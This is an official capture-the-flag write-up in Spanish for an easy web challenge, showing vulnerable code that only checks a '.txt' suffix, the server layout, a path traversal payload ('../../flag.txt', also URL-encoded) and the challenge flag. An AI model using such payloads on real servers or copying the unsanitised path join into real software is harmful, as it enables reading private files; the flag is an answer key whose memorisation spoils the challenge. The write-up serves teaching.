# 📋 Writeup Oficial: Ruta Prohibida

| Campo | Detalle |
| :--- | :--- |
| **Categoría** | Web / Path Traversal |
| **Dificultad** | Fácil (Easy) |
| **Puntos** | 300 |
| **Flag** | `CHRONOS{lfi_directory_traversal_flag_0346}` |

---

## 1. Análisis de la Vulnerabilidad

El endpoint principal recibe el parámetro `view` por método GET y realiza una validación insuficiente: comprueba únicamente que la cadena termine en `.txt`:

```python
if not requested_file.lower().endswith(".txt"):
    error = "Formato no admitido. El visor solo procesa archivos TXT."
else:
    target = Path(app.config["ARCHIVE_ROOT"]) / requested_file
    content = target.read_text(encoding="utf-8")
```

La ruta recibida se concatena directamente con `archive/public/` sin normalizar ni verificar que el archivo de destino permanezca contenido dentro del directorio permitido.

Estructura del servidor:
```text
/app/
├── flag.txt
├── app.py
└── archive/
    └── public/
        └── welcome.txt
```

---

## 2. Explotación (Path Traversal / LFI)

Para escapar del directorio `archive/public` y alcanzar la raíz `/app`, se requieren retroceder dos niveles en la jerarquía del sistema de archivos (`../..`), conservando la extensión `.txt`:

```text
/?view=../../flag.txt
```

O codificada en URL:
```text
/?view=..%2F..%2Fflag.txt
```

Al solicitar la ruta manipulada, el servidor lee el archivo `/app/flag.txt` y lo renderiza en el cuerpo de la página:

```text
CHRONOS{lfi_directory_traversal_flag_0346}
```
